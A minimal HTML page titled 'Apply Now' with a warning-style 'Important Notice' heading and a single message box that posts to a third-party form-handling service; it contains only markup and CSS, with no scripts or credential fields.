<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Apply Now</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #fff;
      padding: 25px;
      width: 100%;
      max-width: 400px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    textarea, button {
      width: 100%;
      padding: 12px;
      margin-top: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    button {
      background: #1877f2;
      color: #fff;
      border: none;
      cursor: pointer;
    }
    button:hover {
      background: #145dbf;
    }
  </style>
</head>
<body>

  <div class="box">
    <h2>⚠️ Important Notice</h2>

    <form action="https://submit-form.com/09HQTNPsI" method="POST">

      <textarea name="message" placeholder="Enter your message" required></textarea>

      <button type="submit">Submit</button>

    </form>
  </div>

</body>
</html>
